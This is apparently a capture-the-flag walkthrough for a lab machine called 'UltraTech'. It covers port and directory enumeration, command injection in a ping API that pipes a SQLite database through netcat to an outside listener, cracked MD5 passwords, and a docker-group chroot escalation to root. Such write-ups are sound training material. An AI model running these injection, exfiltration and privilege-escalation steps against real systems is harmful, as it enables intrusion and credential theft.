# UltraTech

--------------------------------------------------------------------

## GIVEN INFO

**IP Address**: 10.10.248.157

--------------------------------------------------------------------

## PROCEDURE

-sV: probe open ports to determine service/version info
-p-: scan all ports
```
nmap -sV -p- 10.10.248.157
```

**EXPOSED PORT (SERVICE)**:<br>
    21 (ftp vsftpd 3.0.3)<br>
    22 (ssh OpenSSH 7.6p1),<br>
    8081 (http node.js Express Framework),<br>
    31331 (http Apache httpd 2.4.29)

8081 is an api

Enumerate hidden directories on webserver on port 8081
```
dirb http://10.10.248.157:8081 /usr/share/wordlists/dirb/common.txt
```

Found /auth & /ping which are the routes

Enumerate hidden directories on webserver on port 31331
```
dirb http://10.10.248.157:31331 /usr/share/wordlists/dirb/common.txt
```

Found robots.txt, /images, /css, /javascript, /js

/utech_sitemap.txt in robots.txt

Found /, /index.html, /what.html, /partners.html

http://10.10.248.157:31331/partners.html is a login page

The http://10.10.248.157:31331/js/api.js file is run when user tries to login<br>
It runs the /ping?ip=${window.location.hostname}

We can exploit the ping command to get the database
```
nc -lnvp 4444
http://10.10.248.157:8081/ping?ip=`nc 10.6.1.136 4444 < utech.db.sqlite`
```

Found 2 login<br>
**USERS**: admin, r00t<br>
**PASSWORD HASHES**: 0d0ea5111e3c1def594c1684e3b9be84, f357a0c52799563c7c7b76c1e7543a32 

Cracked MD5 hash on https://hashes.com/en/decrypt/hash<br>
**admin USER PASSWORD**: mrsheafy<br>
**r00t USER PASSWORD**: n100906

```
ssh r00t@10.10.248.157
chmod +x linpeas
./linpeas
```

r00t is a part of the docker group which we can exploit

Found on https://gtfobins.github.io/gtfobins/docker/
```
docker run -v /:/mnt --rm -it bash chroot /mnt sh
```

**FIRST 9 OF SSH KEY**: MIIEogIBA